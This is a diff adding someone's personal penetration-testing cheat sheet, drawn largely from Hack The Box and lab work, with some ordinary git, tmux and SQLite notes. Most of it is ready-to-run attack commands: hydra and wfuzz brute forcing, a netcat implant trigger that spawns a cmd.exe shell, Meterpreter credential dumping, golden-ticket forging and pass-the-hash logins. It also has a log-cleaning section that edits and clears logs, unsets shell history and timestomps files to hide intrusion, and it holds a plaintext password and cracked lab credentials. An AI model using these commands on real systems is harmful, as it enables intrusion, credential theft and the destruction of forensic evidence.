@@ -1,0 +1,2177 @@
+{{{ ###Brute Force
+{{{ #cewl
+	- Generic Syntax
+		$ cewl -d 2 -m 5 -w cewlwords.txt [http://dc-2/](http://dc-2/)
+		$ cewl -a -e -m 5 -d 2 -w cewlwords.txt [http://forum.bart.htb](http://forum.bart.htb)
+
+}}} #
+{{{ #hydra
+	- Generic Syntax
+		$ hydra -e nsr -l charles -P old-password.bak -t 6 ssh://192.168.11.129
+		$ hydra -l harvey -P /root/Desktop/Tools/Wordlists/rockyou.txt internal-01.bart.htb http-post-form "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=Login:Password"
+		$ hydra -s 8080 10.10.251.164 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password" -l admin -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -t 10 -w 30 
+		$ hydra -l wade -P ./fsocity.dic 10.10.163.14 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+	- Proxy through burp 
+		$ HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -C  /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -s 80 10.10.10.95 http-get /manager/html
+			- forward to burp after auth attempt                     ^ to use collon sperated user:pass                                                                            ^Source port ip    http-get ^url
+			- make sure intercept is OFF
+
+}}} #
+{{{ #john
+	$ unshadow passwd.txt shadow.txt > unshadowed.txt
+	$ john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+
+}}} #
+{{{ #wfuzz 
+	- Notes:
+		- FUZZ is the magic word. replace admin with root and other potential usernames.^^
+		- view page source and see if it is looking user, uname, username etc... same with pword.
+	- Generic Syntax 
+		$ wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt -d "username=admin&password=FUZZ"  --hh 206 http://192.168.11.129/login.php
+		$ wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt -d "username=admin&password=FUZZ" http://192.168.11.129/login.php | grep -v 206
+		$ wfuzz -c -z file,~/Desktop/UVW.txt jewel.uploadvulns.thm/content/FUZZ.jpeg
+		$ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -w /usr/share/seclists/Fuzzing/LFI-LFISuite-pathtotest.txt -u http://192.168.11.130/thankyou.php?FUZZ=FUZ2Z | grep -v 851 | grep -v 835 > LFIList.txt
+			- http://192.168.11.130/thankyou.php?file=/etc/passwd  <<< paramater name file was found as well as pathtohost /etc/passwd
+			- used to brute force a get request to a webpage
+		$ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/SVNDigger/all-extensionless.txt -u http://192.168.11.130/thankyou.php?file=FUZZ | grep -v 835                     <<<use against url
+		$ wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/SQL.txt -d "myusername=john&mypassword=FUZZ&Submit=Login"  http://192.168.11.8/checklogin.php             <<<use against page input
+
+}}} #
+
+}}} ###
+{{{ ###Ergonomics
+{{{ #git 
+	{{{ #ssh Auth Setup
+		- Create Key 
+			$ ssh-keygen -o -t rsa -C "chrischmid32@gmail.com"  
+			$ cat /root/.ssh/id_rsa.pub
+
+		- Now copy the key into the ssh key page on github website
+			$ ssh -T git@github.com   #to test that the key works
+
+		- verfy that ssh-agent is running and manually add the private key (Should be done automatically if it is in the .ssh dir
+			$ eval "$(ssh-agent -s)"  
+			$ ssh-add /root/.ssh/id_rsa
+
+		- verify global username and email
+			$ git config --global user.name CoolHandSquid  
+			$ git config --global user.email chrischmid32@gmail.com
+
+		- SSH Clone Syntax
+			$ git clone git@github.com:CoolHandSquid/SquidKMS
+			
+		- Push Syntax 
+			$ git remote set-url origin git@github.com:CoolHandSquid/TireFire	#Only need to do once (none if cloned with ssh)
+			$ git add *
+			$ git commit -m "Yeeting for the Cannon"
+			$ git push 
+			
+	}}} #
+	{{{ #Workflow
+		$ git clone
+		$ git pull <remote> <branch> #(default is origin main)
+		$ git status
+		$ git add
+		$ git rm
+		$ git commit -m "KHM"
+		$ git push <remote> <branch> #(default is origin main)
+		$ #advanced
+		$ git remote add upstream https://github.com/CoolHandSquid/TireFire.git
+		$ git rebase #squash commit history
+
+	}}} #
+	- Hard reset to master branch
+		$ git fetch origin
+		$ git reset --hard 
+	- Hunting
+		$ git log --all -p --full-diff  
+		$ git tag 
+		$ git show
+	- Update to origin/master
+		$ git status
+		$ git add * .*
+		$ git rm * .*
+		$ git commit -m "KHM"
+		$ git push
+		$ git status
+		
+}}} #
+{{{ #links
+	- Display text of HTML page in terminal 
+		$ links --dump http://192.168.1.5:80/data 
+
+}}} #
+{{{ #notepad++
+	- Define your language
+		1. Language >: User Definded Language >: Define your Language... (Click)
+		2. If the preinstalled markdown dark is there, it's the one you want
+		3. In the *Folder & Default* tab, set the folds
+			![[Notepad++_1-Folds.png]]
+		4. In the *Comment & Number* tab, remove everything
+		5. In the *Operators & Delimiters* tab, remove everything from Operators1 and Operators2
+	- Plugins
+		- If you can load them, they are helpful, otherwise, go fuck yourself.
+			1. AutoSave
+			2. MarkdownPanel
+			3. NPPGist *Unverified but sounds cool*
+	- Style
+		- Zenburn
+			- Settings >: Style Configurator >: Select theme: Zenburn
+
+	- Hotkeys
+		- To speed up header creation record the three header macors and save them to Alt + keypad 1, 2, and 3
+		- Other Notable Hotkeys
+
+	Hotkey 		| Usage
+	--- 		| ---
+	Alt+0 		| Close All Folds
+	Alt+Shift+0 | Open ALL Folds
+	Alt+Num1,2,3| Create Header Synax for level 1, 2 or 3.
+	
+	- Sort | uniq 
+		- Find and replace (regex) $ ^(.*?)$\s+?^(?=.*^\1$) 
+
+}}} #
+{{{ #obsidian
+	- Install Obsidian on Kali
+		1. Download snap package from [Obsidian Website](https://obsidian.md/download)
+		2. Install snap
+			$ apt update
+			$ apt install snapd
+		3. enable Service and start
+			$ systemctl enable --now snapd apparmor
+		4. Verify snap functionality
+			$ snap install hello-world	#you should recieve "Hello World!
+		5. Run Snap on Obsidian
+			$ snap install --dangerous obsidian_0.12.19_amd64.snap
+		6. Start obsidian
+			$ obsidian
+
+}}} #
+{{{ #putty
+	- Get Command Count
+		- Session > Logging Options:
+			- All Session Output 
+	- Get Used Bandwidth
+		- Putty log size 
+	
+}}} #
+{{{ #tmux 
+	$ tmux new -s yeet #Start a tmux session
+	$ tmux ls
+	$ tmux attach -t yeet (tmux a -t yeet)
+        $ 
+
+	$ tmux kill-session -t yeet
+	$ tmux kill-session -t yeet -a (kill all sessions except yeet)
+	$ tmux kill-server	(kill all sessions)
+
+	{{{ #BOC Scripts 
+read Daily Read
+read Mission plan...
+See If Mission Plan IP's are covered by NSDB
+Script Tunnels and Shorthand Gameplan
+Setup Tmux in tilix
+Setup Notes in qterminal
+Confrim IP's With MC
+
+
+Operate...
+
+
+Make sure you Told MC about All Disco's
+Debrief the MC
+archive
+close notes
+Create NSDB
+close NSDB
+exit (to close term screen) on each terminal)
+cd ..
+tar -cvf schmid_20-04-21_MM1.tar   schmid_20-04-21_MM1
+scp schmid_20-04-21_MM1.tar student14@10.50.24.17:~
+password14
+verify reception
+
+
+
+
+
+on Kali (through x11)
+date=20-05-21
+miss=Eval08
+targs=8
+dm=$date\_$miss
+mkdir /root/schmid_$dm
+cd /root/schmid_$dm
+cp /root/NotesTemplate /root/schmid_$dm/notes_$date
+cp /root/NSDBTemplate /root/schmid_$dm/NSDB_$date
+touch Survey_0.0.0.0
+
+tmux new-session -s Targets -d -n KaliTarget
+tmux send-keys -t Targets:0  cd Space /root/schmid_$dm Enter script Space -af Space termscreen.$RANDOM Enter
+for i in $(seq 1 $targs); do
+	tmux new-window -t Targets:$i -n T$i -d
+	tmux send-keys -t Targets:$i cd Space /root/schmid_$dm Enter script Space -af Space termscreen.$RANDOM Enter
+done
+
+tmux new-session -s Masters -d -n KaliMaster
+tmux send-keys -t Masters:0  cd Space /root/schmid_$dm Enter script Space -af Space termscreen.$RANDOM Enter
+for i in $(seq 1 $targs); do
+	tmux new-window -t Masters:$i -n T$i -d
+	tmux send-keys -t Masters:$i  cd Space /root/schmid_$dm Enter script Space -af Space termscreen.$RANDOM Enter
+done
+
+
+
+
+
+
+cd ..
+tar -cvf schmid_$date\_$miss.tar schmid_$date\_$miss
+scp schmid_$date\_$miss.tar student14@10.50.24.17:~
+password14
+verify reception
+
+	}}} #
+    {{{ #Conf File
+.tmux.conf
+```O
+set -g allow-rename off
+set -g mouse on
+set-window-option -g mode-keys vi
+```C 
+    
+    }}} #
+    {{{ #Quick Commands Table
+		Function					|	Ctrl B...	
+		--- 						| 	---
+		Sessions 					|	
+		Detach Sessions 			| d
+		Rename Sessions				| $
+		Swith Between Sessions		| s
+		panes						|	
+		Split Horizontal			| "
+		Split Vertical				| %
+		Swith Pane					| arrows
+		Kill Pane					| x
+		Rotate Panes				| { or }
+		Cycle Suggestions			| SpaceBar
+		Show Pane Numbers			| q
+		Windows						|
+		New Window 					| c
+		Rename Window				| ,
+		Send Pane to own window 	| !
+		Switch beteen ALL windows 	| w
+		kill windows				| &
+		Overall						|
+		Change tmux dir				| attach -c /dev/shm (a -c /dev/shm)
+		swap pane locations			| swap-pane -s 3 -t 2
+		Send pane to window			| join-pane -t windowsname
+
+	}}} #
+    {{{ #Search (Copy and Paste)
+        1. Enter copy mode [
+        2. Use space bar to start/stop highlighting text (this is cool becasue vim search features / $ gg G :10 n N work)
+        3. Hit ENTER, sending highlighted text to specail tmux clipboard
+        4. ] to paste.
+
+    }}} #
+
+}}} #
+
+}}} ###
+{{{ ###Exploits
+{{{ #Implants
+	{{{ #Triggers
+		- On Target
+			$ for /F %%i in ('nc -l -p 22'); do set KEY=%%1; if ( %KEY% equ 123456 ); do nc -l -p 3232 -e cmd.exe; done;fi;done 
+		- On Opstation
+			$ echo 123456 | nc 1.1.1.1 22
+			$ nc 1.1.1.1 3232
+			
+	}}} #
+
+}}} #
+{{{ #linux/samba/is_known_pipename
+	- May log IP to /var/log/samba 
+	- May leave artifact like "GWt5rjie.so" in /samba/anonymous
+
+}}} #
+{{{ #windows/misc/bcaaa_bof
+	- Blue Coat
+	- Application Event ID 2207 #Sometimes
+
+}}} #
+{{{ #windows/smb/ms-08-067
+	- Logs 
+		$ psloglist.exe -i 529 -h 1 SECURITY 	#Look for weird hostnames (529 and 680)
+
+}}} #
+
+}}} ###
+{{{ ###Languages
+{{{ #Python
+    {{{ #SqllitePython3Notes.py
+```O
+#!/usr/bin/python3
+import sqlite3
+conn    = sqlite3.connect("TireFire.db")
+c       = conn.cursor()
+
+#Create Table
+#c.execute("""CREATE TABLE Main (
+#            Name text,
+#            Port text,
+#            Description text
+#    )""")
+#c.execute
+###Datatypes: NULL, INTEGER, REAL, TEXT, BLOB
+
+#Add A Record
+#c.execute("""INSERT INTO Main VALUES ('FTP', '21', 'File Transfer Protocol')""")
+
+#Add Many Records At Once
+#protocols   = [
+#        ('SMTP', '25', 'Simple Mail Transfer Protocol'),
+#        ('DNS', '53', 'Domain Name Service'),
+#        ('Kerberos', '88', 'AD Domain Authentication Service')
+#        ]
+#c.executemany("""INSERT INTO Main VALUES (?,?,?)""", protocols)
+
+#Query The Database
+#c.execute("SELECT * FROM Main")
+#c.fetchone()#Fetch the first item in table
+#c.fetchmany(3)#Fetch first 3 items in table
+#c.fetchall()#Fetch all items in table
+#print(c.fetchall())#You can call individual parts of the tuple with [2]
+
+#Cool Query Things
+#c.execute("SELECT rowid, * FROM Main")#Prints the row id as the first collum (starting at 1)
+#c.execute("SELECT * FROM Main WHERE Name = 'DNS'")#Duh
+#c.execute("SELECT * FROM Main")#< > <= >= = Work for INTEGER and REAL
+#c.execute("SELECT * FROM Main WHERE Description LIKE '%Domain%'")#LIKE with % can be used similar to a regex *
+#items   = c.fetchall()
+#for item in items:
+#    print(item)
+
+#Update Records
+#c.execute("""UPDATE Main SET Port = '21' WHERE NAME = 'FTP'""")
+#c.execute("""UPDATE Main SET Port = '22' WHERE rowid = 1""")
+#c.execute("""SELECT * FROM Main""")
+#print(c.fetchall())
+
+#Delete Records
+#c.execute("""DELETE FROM Main WHERE rowid = 1""")
+#c.execute("SELECT * FROM Main")
+#print(c.fetchall())
+
+#Query The DB - ORDER BY
+#c.execute("""SELECT rowid, * FROM Main ORDER BY Port DESC""")
+#ASC    = Ascending
+#DESC   = Descending
+#for i in c.fetchall():
+#    print(i)
+
+#Query The Db - AND/OR
+#c.execute("Select rowid, * FROM Main WHERE Name LIKE 'Kerb%' OR Port = '21'")
+#for i in c.fetchall():
+#    print(i)
+
+#Query The DB - LIMIT
+#c.execute("Select rowid, * FROM Main Limit 3")
+#for i in c.fetchall():
+#    print(i)
+
+#DROP (Delete) A Table
+#c.execute("DROP TABLE Main")
+
+
+
+conn.commit()
+conn.close()
+
+```C
+
+    }}} #
+
+}}} #
+{{{ #Ruby
+	- MSF 
+		- Dir Prefetch
+			```O
+			irb 
+			files = client.fs.dir.entries_with_info("C:\\windows\\prefetch")
+			DeleteMe = []
+			i = 0
+			while i < files.length
+				filename = files[i]["FileName"]
+				filemtime= files[i]["StatBuf"].mtime
+				DeleteMe.append("#{filemtime} #{filename}")
+				puts DeleteMe
+				i += 1
+			end 
+			```C
+		
+		
+}}} #
+
+}}} ###
+{{{ ###Log Cleaning
+{{{ #Fundamentals (Delete Me?)
+	- Windows
+		- Event Logs
+			- System 
+			- Application
+			- Security
+		- Application logs 
+			- SQL Error 
+			- IIS Server
+		- Firewall (disabled by default)
+		- WMI Trace Logs 
+		- Prefetch
+		- Microsoft Debug
+			- Dr Watson (XP) (64kb)
+			- Windows Error Reporting (WER)
+		- at (Pre-Vista)
+			- C:\Windows\SchedLgu.txt
+	- Unix 
+		- System Events 
+			- /var/log 
+		- Shell 
+			- .bash_history
+		- Login Attempts
+			- utmp
+			- wtmp
+			- btmp
+		- System Logs 
+			- /etc/syslog.conf 
+			- /etc/rsyslog.conf
+			- /etc/syslog-ng
+		- Core Debug (memory Debug)	
+			$ ulimit -c #0=Disabled
+			- /etc/security/limits.conf	#Size limit defined
+			- Often written to /core
+		- Remote Logging
+		- Delayed Writing
+			- .bash_history
+			- ssh session close
+		
+}}} #
+{{{ #Unix 
+	- /var/log Cleaning (IP Search)
+		$ for log in `find /var/log -type f -mmin -10 2 > /dev/null`; do tail $log | grep 1.1.1.1;done 
+		$ grep -v "sshd\[3232\]" /var/log/secure > /tmp/secure.clean	#Search by PID
+		$ cat /tmp/secure.clean > /var/log/secure
+		$ touch -t 201504211118.24 /var/log/secure #Match time of real cleaned log
+		$ rm -rf /tmp/secure.clean
+	- Command History 
+		$ unset HISTFILE
+
+}}} #
+{{{ #Windows 
+	- Event Logs (security, system, application)
+		$ run event_manager -c security			#(MSF) Clear Logs 
+		$ run event_manager -l security 		#(MSF) View Logs 
+		$ run event_manager -i 					#(MSF) Get Logs Configs/Stats
+		$ run event_manager -l security -f 517	#(MSF) Verify the only log is 517 
+	- Firewall 
+		$ run getcountermeasure 
+		$ shell 
+			$ wmic os get localdatetime
+			$ netsh firewall show logging 					#Get File Location XP
+			$ netsh advfirewall show allprofiles			#Get File Location Vista+						
+			$ dir  C:\windows\pfirewall.log 				#Get Log Update Time 
+			$ findstr /R "1.1.1.1" C:\windows\pfirewall.log	#Get My Entries
+			$ findstr /V /R "1.1.1.1.*32032" C:\windows\pfirewall.log  > C:\windows\temp\sd_102.tmp 	#Remove Entries
+			$ findstr "1.1.1.1" C:\windows\temp\sd_102.tmp	#Verify Cleanlyness
+			$ netsh firewall set opmode disable				#Stop Firewall Service 
+			$ move C:\windows\temp\sd_102.tmp C:\windows\pfirewall.log 		#Overwrite log 
+			$ type C:\windows\pfirewall.log | find /c /v ""	#Get wc -l 
+			$ more C:\windows\pfirewall.log +1087				#Get Last Line (#=wc -l -1) write time 
+			$exit 
+		$ timestomp C:\windows\pfirewall.log -m "31/12/2015 23:26:02"	#Timestomp
+		$ run multicommand -cl "netsh firewall set opmode enable"		#Restart Firewall 
+	- Prefetch 
+		$ shell
+			$ cd c:\windows\prefetch
+			$ cmd.exe /c dir /A /o:d /t:w	#Sort Files by write time 
+			$ cat > pf.txt 					#Pasted block of files 
+			$ vim pf.txt 					#Tailor down to files you want to delete 
+			$ awk '{print $5}' 				#Copy Ouptut
+			$ del {paste}					#Delete Files 
+			$ cmd.exe /c dir /A /o:d /t:w	#repeat
+	- Error Reporting 
+		- Older than Vista
+			$ shell 
+				$ dir C:\*.*dmp /s | find /i "dmp" | sort /r	#Locate dump files
+				$ dir C:\*.*dmp /s | find /i "dmp" | sort /r	#Locate dump files
+				$ dir C:\*.*wer /s | find /i "wer" | sort /r
+				$ cd yeet
+				$ dir
+				$ rm *.dmp *.hdmp *.mdmp *.wer		#rm if they were changed while you were on target #.dmp=Vista and older	
+	- Notes 
+		- EID 517=Cleared Logs 
+		$ psloglist.exe "Windows Powershell"
+
+}}} #
+
+}}} ###
+{{{ ###Metasploit
+{{{ #Framework
+	- Start metasploit
+		$ msfconsole -n 	#-n if you do not want to configure postgresql 
+	- Log output to file
+		$ spool /root/`date "+%x"`
+		
+}}} #
+{{{ #Meterpreter 
+	{{{ #General Syntax 
+		- Multicommand 
+			$ run multicommand -cl "cmd /c dir c:\\windows\\temp /od /tw"
+		- Run background script 
+			$ execute -f fpipe.exe -a '-l 12345 -r 45678 192.168.11.26'
+		- reg 
+			- Get Key 
+				$ reg enumkey -k "HKLM\\software\\microsoft\\windows\\currentversion\\run"
+			- Get Value
+				$ reg queryval -k "HKLM\\software\\microsoft\\windows\\currentversion\\run" -v some-key-name-under-run	
+		- WMIC 
+			$ run post/windows/gather/wmic_command COMMAND="startup list"
+		- Find Files 
+			$ search -d c:/users -f *.doc	
+		- Upload, Execute, and Delete a file  
+			$ run get_env -h
+			$ run uploadexec -e /root/yeet.exe -r -v  
+			- Confirm File was Deleted 		
+
+	}}} #
+	{{{ #Shell Managment
+		- Create Secondary Shell 
+			$ run duplicate -D -P 364 -p 443 -r 192.168.137.152
+			- OR -
+			$ run post/windows/manage/multi_meterpreter_inject IPLIST=1.1.1.1 LPORT=32012 HANDLER=true
+		- Migrate to x64 process 
+			$ run post/windows/manage/archmigrate IGNORE_SYSTEM=true
+		- steal token
+			$ steal_token 3232	#3232=PID
+			
+	}}} #
+
+}}} #
+{{{ #Enumeration/Interaction
+	{{{ #Domain  
+		Get							| Command 
+		---							| ---
+		EXTAPI						| #
+		Domain Name 				| $ run post/windows/gather/enum_domain
+		Domain Computers			| $ adsi_computer_enum
+		Domain Users 				| $ adsi_user_enum
+		Domain Admins 				| $ adsi_nested_group_user_enum ARCTIC "CN=Domain Admins,CN=Users,DC=BOOT,DC=lab" 	#ARCTIC=DC name 
+		KIWI						| #
+		Kerberos Creds 				| $ creds_kerberos 
+		LSASS Memory				| $ kiwi_cmd sekurlsa::logonpasswords
+		Service Account GPO Pwd Dump| $ run post/windows/gather/credential/gpp
+		
+		{{{ #Golden Ticket
+			- Create Ticket 
+				$ golden_ticket_create -u mossa -d BOOT.lab -k TGTHASH -s DOMAINSID -t /root/yeet.ticket
+				$ golden_ticket_create -u mossa -d BOOT.LAB -k #:TODO -s S-1-5-21-348695234-4083971140-3581807652 -t /root/yeet.ticket
+			- Use Ticket
+				$ load kiwi 
+				$ kerberos_ticket_list								#List Current Tickets
+				$ kerberos_ticket_purge								#Purge Current Tickets 
+				$ kerberos_ticket_use /root/yeet.ticket				#Use Ticket (Ticket Location is on OpBox)
+				$ kerberos_ticket_list								#List Current Tickets 
+				$ run multicommand -cl 'cmd /c dir \\ARCTIC\C$'		#Give it a shot!
+		
+		}}} #
+		
+	}}} #
+	{{{ #Host  
+		Get							| Command 
+		---							| ---
+		SA 							| #
+		Time 						| $ localtime
+		IP/MAC						| $ ipconfig 
+		System info 				| $ sysinfo 
+		System info					| $ run multicommand -cl 'cmd /c systeminfo'
+		PID 						| $ getpid 
+		Current User 				| $ getuid
+		Process List 				| $ ps 
+		Privs						| $ run multicommand -cl 'whoami /priv'
+		NETWORKING					| #
+		DNS							| $ run multicommand -cl 'netsh interface ip show config'
+		Routing Table 				| $ route 
+		netstat (TCP)				| $ netstat 
+		Network Shares				| $ run multicommand -cl 'net share'
+		internet proxy				| $ getproxy
+		USERS						| #
+		logged-on user idle time 	| $ idletime
+		logged on user info 		| $ run post/windows/gather/enum_logged_on_users
+		local administrators		| $ run multicommand -cl 'net localgroup administrators'
+		lockout policy				| $ run multicommand -cl 'net accounts'
+		hashdump					| $ run post/windows/gather/smart_hashdump
+		ADVANCED SA 				| #
+		services					| $ run post/windows/gather/enum_services
+		Drive Info					| $ show_mount
+		schtasks					| $ run multicommand -cl 'schtasks /query'
+		environment variables		| $ run post/multi/gather/env
+		interesting files			| $ search -f *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.pdf 
+		error logs (dump)			| $ search -f *.wer
+		COUTERMEASURES				| #
+		security products			| $ run getcountermeasure
+		firewall					| $ run multicommand -cl 'netsh advfirewall show currentprofile'	
+		event Log info 				| $ run event_manager -i # $ run multicommand -cl 'psloglist.exe  [SYSTEM|SECURITY|APPLICATION]'
+		log files 					| $ run multicommand -cl 'cmd /c dir c:\\*.log /S /A /od /tw'
+		installed applications		| $ run post/windows/gather/enum_applications
+
+	}}} #
+	{{{ #Network 
+		Get					| Command
+		---					| ---
+		Resolve Hostname	| $ resolve TheYeetCannon TheOtherYeetCannon
+		SMB					| $ run multicommand -cl 'nbtstat -A 192.168.1.2'
+		Firewall Rules		| $ run multicommand -cl 'netsh advfirewall firewall show rule name=all'
+		Add Firewall Rules	| $ run multicommand -cl 'netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389'
+		Add route			| $ route add 192.168.106.50/32 5		#5=session Number
+		Remove route		| $ route remove 192.168.106.50/32 5
+		PORTFWD				| #
+		Forward 			| $ portfwd add -L 127.0.0.1 -l 3232 -p 3233 -r 1.1.1.1	#-L=msflocalhost -l=in -p=dstport -r=remotehost 
+		Reverse Forward		| $ portfwd add -R -L 1.1.1.2 -l 3233 -p 3232			#-R=Indicates Reverse -L=FWDIP -l=FWDPort -p=LISTPort
+
+	}}} #
+
+}}} #
+			
+}}} ###
+{{{ ###FileTypes
+{{{ #doc/docm
+	- docm/doc lateral movment
+		- Running as Tire from UserBox, we will make a macro calling nc.exe in an excel document, use DCOM to move the file to bossman and then execute the macro getting a reverse shell on the kali box.
+		- Create a macro that when executed will give you a reverse shell.
+			- Note: 
+				- You may need to add a firewall rule depending on the networks GPO to create the COM object.
+					$ New-NetFirewallRule -DisplayName "Allow DCOM" -Direction Inbound -Action Allow -Enabled True -RemoteAddress 192.168.40.133
+					$ Remove-NetFirewallRule -DisplayName "Allow DCOM"
+	- doc/docm Shell
+		- See OSCP Book
+
+}}} #
+{{{ #dmp
+	- Get info 
+		$ file foo.dmp
+	- Get os 
+		$ volatility -f foo.dmp imageinfo
+	- Get Hashses	
+		$ volatility -f foo.dmp --profile Win2012R2x64 hashdump
+		$ pth-winexe -U Administrator%lmhashhhhhhhhhhhh:NTLMhashhhhhhhhh //10.10.10.82 cmd
+
+}}} #
+{{{ #fifo
+	- Terminal 1
+		$ mkfifo squidsfifo
+		$ while read line < squidsfifo; do echo $line; if [ $line == "quit" ];then break;fi;done
+	- Terminal 2
+		$ echo yeet > squidsfifo
+
+}}} #
+{{{ #groups.xml
+	- Sometimes holds credentials (pre windows 2012)
+	- These should be treated as normal creds. (use them for smb stuff and winrm and whatnot)
+	- Decrpypt file 
+		$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+			/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
+			GPPstillStandingStrong2k18
+
+}}} #
+{{{ #kdbx/keepass
+	- Get a hash of keepass to crack later
+		$ keepass2john CEH.kdbx > keepasshash.txt
+		- make sure to drop the CEH: part
+		- CEH:$keepass$*2*6000*222*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
+		$ hashcat64.exe -m 13400 yeet\jeeves.txt yeet\rockyou.txt
+		- You may have to delete a space from the end of *jeeves.txt*
+	- Open keepass file
+		$ keepassx	
+		$ keepass2
+			$ dc recovery         S1TjAtJHKsugh9oC4VZl
+			$ backup stuff        aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+
+	- Get Shell 
+		$ winexe -U jenkins/administrator%S1TjAtJHKsugh9oC4VZl //10.10.10.63 cmd.exe
+		$ pth-winexe -U jenkins/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe
+
+}}} #
+{{{ #mdb
+	- Read File 
+	- Excel (less than optimal)
+	- klexi
+	- mdbtools 	#ippsec reccomended
+		$ apt install mdbtools
+		$ mdb-sql mdbtables
+	- run strings to quickly look for potential username/passwords
+		$ strings -n 8 file.mdb | sort -u > words.txt
+	- ippsec sermon
+		$ mkdir tables
+		$ for i in $(mdb-tables file.mdb); do mdb-export file.mdb $i > tables/$i; done        	# This will make a directory full of contets for each table locally.	
+		$ cd tables	
+		$ wc -l | sort -n             															# Shows you what tables have data and which are 1 line (empty)
+
+}}} #
+{{{ #pem
+	- An ssh private key file which can be used to log in to ssh
+	$ chmod 600 alice.pem 
+	$ ssh alice@10.10.10.7 -i alice.pem
+
+}}} #
+{{{ #ppk
+	- Putty ssh private key 
+	- Get File Password (if it has one)
+		$ puttyzip2john alice.ppk
+	- Use it
+		$ apt install putty-tools private-openssh-new
+		$ puttygen alice.ppk -O private-openssh -o alice.pem                  
+		$ chmod 600 alice.pem 
+		$ ssh alice@10.10.10.7 -i alice.pem
+
+}}} #
+{{{ #pst
+	- Get readable .mbox file
+		$ readpst file.pst
+		$ more file.mbox 
+
+}}} #
+{{{ #vhd
+	- A vhd is a virtual hard disk. They are often found in pairs, one being the boot partion, the other being where the data lies.
+	- List Files
+		$ 7z l sdfasdfasdf.vhd        to list the files
+	- Extract Files (these can be huge, so not optimal)
+		$ 7z x asdfasdfsdf.vhd
+	- Notes
+		- Once you have the .vhd on the box (optimally haveing the drive that contains the vhd mounted.
+		- Run guestmount to mount the .vhd as another drive.
+			$ guestmount --add /mnt/Bastion/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd
+			$ cd /mnt/vhd
+
+	- Get windows Jucies
+		$ c:\windows\system32\config
+			$ sam (user database)
+			$ system  registy hives (hklm) (system boot key)
+			$ ntvs.dit if it is a dc
+		- cp these dirs to /Yeet/Machines/HTB/Bastion/dbdump
+		- run impacket-secretsdump on the file and BOOOM Hashes!!     
+			$ ls
+				SAM  SYSTEM
+			$ impacket-secretsdump -sam SAM -system SYSTEM local
+				Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+				[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
+				[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+				Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+				Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+				L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+				[*] Cleaning up... 
+
+}}} #
+{{{ #xlsm
+	- Open in Windows Excel or use olevba to see the VBA scripts (macros) embeded in the file.
+	$ pip install -U oletools
+	- https://github.com/decalage2/oletools/blob/master/cheatsheet/oletools_cheatsheet.pdf
+	$ olevba3 filename.xlsm
+
+}}} #
+{{{ #zip
+	- Install the full version 7zip.
+		$ sudo apt-get install p7zip-full
+	- Unzip your file.
+		$ 7z  x  your-file.zip
+	- Unzip Password Protected File
+		$ 7z  x  -pPASSWORD  your-file.zip
+	- Get Metadata and Subarchives
+		$ 7z l -slt file.zip
+	- Brute Force 
+		$ zip2john file.zip > file.hash
+		$ john AC.hash --wordlist=words.txt
+
+}}} #
+
+}}} ###
+{{{ ###Initial Enumeration
+{{{ #nmap
+	- Generic Syntax 
+		$ nmap -sC -sV -p- -oN Nmap.txt 10.10.10.29  
+		$ nmap -p 445 --script "safe" -Pn -n -oN Blue_Safe.txt 10.10.10.40
+		$ nmap -sV -T4 -p- -oN Mirai.nmap2 10.10.10.48 
+		$ nmap -v -sV -p- --script vuln -T4 10.10.10.48 
+		$ nmap --script smb-vuln* -p 139,445 10.10.10.40
+		$ nmap -Pn -sV -p 995 -vv --script=ssl* 10.11.1.22
+	- Portknock 
+		$ nmap -r -p 1,2,3  192.168.11.252  
+
+}}} #
+
+}}} ###
+{{{ ###Security Products
+{{{ #Avast 
+
+}}} #
+{{{ #Baidu
+	> Name: Baidu Antivirus 2015
+		- c:\program files (x86)\Baidu Security\Baidu Antivirus\il8n\3082\AboutUs\skin
+	> Version: 5.0.3.84333
+		- dir c:\*version.xml /s	#ProgramVersion 
+		$ run post/windows/gather/enum_applications
+	> Scan Engine: 8.3.30.16
+		- c:\program files (x86)\Baidu Security\Baidu Antivirus\config.ini 	#AvEngineVersion
+	> Signature Version: 7.11.224.28
+		- c:\program files (x86)\Baidu Security\Baidu Antivirus\config.ini 	#AvVDFVersion
+	> Latest Signature: 2017/02/27 11:17:45
